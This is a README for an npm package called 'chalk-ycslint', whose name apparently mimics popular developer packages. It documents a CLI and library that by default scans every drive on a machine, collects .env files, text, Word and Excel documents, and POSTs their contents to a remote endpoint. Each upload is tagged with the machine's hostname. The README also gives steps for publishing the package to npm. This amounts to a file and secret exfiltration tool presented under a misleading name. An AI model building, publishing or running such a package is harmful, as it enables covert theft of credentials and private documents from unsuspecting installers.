# chalk-ycslint

**chalk-ycslint** is a Node.js CLI (and small library) that walks directories—or by default the whole machine—collects supported documents, and **POSTs them as JSON** to your own HTTP endpoint. Uploads are **one file per request** by default to avoid huge payloads.

**Requirements:** Node.js **18+**

---

## Install

```bash
npm install chalk-ycslint
```

Global CLI (optional):

```bash
npm install -g chalk-ycslint
```

From the repo folder:

```bash
cd module
npm install
npm link   # optional: makes `chalk-ycslint` available globally
```

---

## Quick start

1. Run a receiver that accepts `POST /` with JSON (see [Payload](#payload) below), or use the example app in this repo: `../file-upload-backend`.
2. Point the CLI at it:

```bash
chalk-ycslint --url "http://127.0.0.1:3000/"
```

By default this does a **full PC scan** (all drive letters on Windows, or `/` on Unix), recursively, while **skipping common system directories**. That can take a long time and touch sensitive files—see [Safety](#safety).

**Scan only specific paths:**

```bash
chalk-ycslint --no-scan-pc --url "http://127.0.0.1:3000/" -r "D:\Projects\reports"
```

**Single file:**

```bash
chalk-ycslint --no-scan-pc --url "http://127.0.0.1:3000/" "D:\Projects\readme.txt"
```

---

## Supported files

| Extension | Handling |
|-----------|----------|
| `.txt`, `.text` | UTF-8 text |
| `.env` | UTF-8 text (including bare `.env` dotfile) |
| `.docx` | Text via [mammoth](https://www.npmjs.com/package/mammoth) |
| `.xls`, `.xlsx` | Sheets as CSV-style text via [xlsx](https://www.npmjs.com/package/xlsx) |

---

## CLI options

| Option | Description |
|--------|-------------|
| `--url <url>` | Receiver URL (required unless `FILE_JSON_UPLOAD_URL` is set). |
| `--field <name>` | JSON body property for the file array (default: `files`). |
| `--header "Name: value"` | Extra HTTP header (repeatable). |
| `--timeout <ms>` | Per-request timeout (default: `60000`). |
| `-r`, `--recursive` | Include subfolders when a path is a directory. |
| `--scan-pc` | Full machine scan (this is **on by default**). |
| `--no-scan-pc` | Only use the paths you list (at least one path required). |
| `--skip-system-dirs` | Skip OS-heavy folders while walking (also on by default with full scan). |
| `--batch` | Send **all** files in **one** JSON body (can be enormous). Default is **one POST per file**. |
| `--client-id <id>` | Sent as `X-Upload-Client` so a dashboard can separate machines (default: env or hostname). |
| `-h`, `--help` | Help text. |

Run `chalk-ycslint --help` for the full text.

---

## Environment variables

| Variable | Purpose |
|----------|---------|
| `FILE_JSON_UPLOAD_URL` | Default `--url`. |
| `FILE_JSON_UPLOAD_SCAN_PC` | Set to `0` or `false` to default to `--no-scan-pc`. |
| `FILE_JSON_UPLOAD_CLIENT_ID` | Default `--client-id` / `X-Upload-Client`. |

Shell variables **override** values from `.env` if they are already set.

---

## `.env` in the package folder

On startup, the CLI loads **`.env` next to `package.json`** in this package (the install root of `chalk-ycslint`), using [dotenv](https://www.npmjs.com/package/dotenv).

Copy the example and edit:

```bash
cp .env.example .env
```

`.env` is **not** published to npm (see `.gitignore`). Create it locally or in `node_modules/chalk-ycslint/.env` after install if you need defaults there.

---

## Payload

Each `POST` sends JSON like:

```json
{
  "files": [
    {
      "filename": "example.txt",
      "mimeType": "text/plain",
      "text": "…file contents…",
      "mammothMessages": []
    }
  ]
}
```

The top-level key matches `--field` (default `files`). Optional `mammothMessages` appears for some `.docx` conversions.

The receiver can read **`X-Upload-Client`** to know which PC sent the upload.

---

## Library API

You can import from `chalk-ycslint` in your own scripts (ESM):

```js
import {
  readTextAndWordFiles,
  postFilesAsJson,
  expandPathsToSupportedFiles,
  listPcScanRoots,
} from "chalk-ycslint";

const paths = await expandPathsToSupportedFiles(["./docs"], { recursive: true });
const files = await readTextAndWordFiles(paths);
await postFilesAsJson({
  url: "http://127.0.0.1:3000/",
  field: "files",
  files,
  clientId: "my-service",
  timeoutMs: 60_000,
});
```

Exported symbols include: `readTextAndWordFiles`, `resolveReadablePath`, `expandPathsToSupportedFiles`, `expandFullPcSupportedFiles`, `listPcScanRoots`, `isPrunedSystemDirectory`, `postFilesAsJson`, `postFilesAsJsonSequential`.

---

## Safety

- **Full PC scan** can read **secrets** (including `.env`, keys, personal documents). Use **`--no-scan-pc`** and narrow paths unless you fully intend a machine-wide export.
- **`.env` files** are included in scans by design; treat the receiver and network path as **highly trusted**.
- **Legal / policy:** only scan machines and data you are allowed to access.

---

## Example receiver in this repo

The sibling folder **`file-upload-backend`** is a minimal Express app: `POST /` accepts the payload above, logs recent items, exposes `GET /api/received`, and serves a small dashboard on `GET /`.

---

## Publish to npm

From this `module` directory:

```bash
npm login
npm publish --access public
```

Ensure the package name **`chalk-ycslint`** is still available on [npm](https://www.npmjs.com/). Bump `version` in `package.json` for every subsequent publish.

---

## License

MIT (see `package.json`). Third-party libraries (e.g. **xlsx**, **mammoth**) have their own licenses—check them before commercial use.
